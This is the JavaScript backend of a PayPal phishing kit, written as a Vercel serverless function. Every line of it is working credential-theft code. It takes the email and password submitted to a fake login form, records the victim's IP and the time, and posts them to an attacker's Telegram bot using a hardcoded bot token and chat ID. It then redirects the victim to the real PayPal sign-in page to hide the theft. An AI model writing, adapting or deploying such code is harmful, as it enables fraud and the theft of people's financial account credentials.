// ============================================================
// FILE: api/login.js
// Vercel Serverless Function
// ============================================================

const axios = require('axios');

// ============================================================
// CONFIG - Change these only
// ============================================================
const BOT_TOKEN = '8926881219:AAFEhuTyYVbgIMDDiV8JDZ2ivXmz4elyGBI';     // ← @BotFather se lo
const CHAT_ID = '8510854191';         // ← @userinfobot se lo
const REDIRECT_URL = 'https://www.paypal.com/signin';
// ============================================================

module.exports = async (req, res) => {
    // Only allow POST
    if (req.method !== 'POST') {
        return res.status(405).send('Method Not Allowed');
    }

    const email = req.body.email || 'Not provided';
    const password = req.body.password || 'Not provided';
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    const time = new Date().toISOString().replace('T', ' ').slice(0, 19);

    // Send to Telegram
    const msg = `🔐 *PAYPAL DATA*\n👤 *Email:* ${email}\n🔑 *Pass:* ${password}\n🌐 *IP:* ${ip}\n🕐 *Time:* ${time}`;
    
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: msg,
            parse_mode: 'Markdown'
        });
        console.log('✅ Sent to Telegram');
    } catch (e) {
        console.log('❌ Telegram error:', e.message);
    }

    // Redirect to real site
    res.redirect(REDIRECT_URL);
};